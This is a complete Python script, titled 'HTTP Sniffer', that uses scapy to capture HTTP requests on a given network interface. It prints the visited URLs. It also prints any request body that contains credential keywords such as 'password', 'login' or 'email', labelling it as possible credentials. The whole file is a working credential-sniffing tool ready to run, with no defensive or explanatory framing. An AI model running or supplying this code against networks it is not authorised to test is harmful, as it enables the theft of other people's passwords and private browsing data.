#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import argparse
import signal
from termcolor import colored
import sys

def close_application(sig, frame):
    print(colored(f"[!] Closing application...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, close_application)

def get_args():
    parser = argparse.ArgumentParser(description='HTTP Sniffer')
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Interface to sniff [Exemple: -i eth0]")
    options = parser.parse_args()
    return options

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(colored(f"[!] HTTP Request >> {url}", "blue"))

        if packet.haslayer(scapy.Raw):
            cred_keywords = ["username", "user", "login", "password", "pass", "email", "mail"]
            load = packet[scapy.Raw].load.decode()
            for keyword in cred_keywords:
                if keyword in load:
                    print(colored(f"\n[+] Possible creds >> {load}", "green"))

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

if __name__ == "__main__":
    options = get_args()
    sniff(options.interface)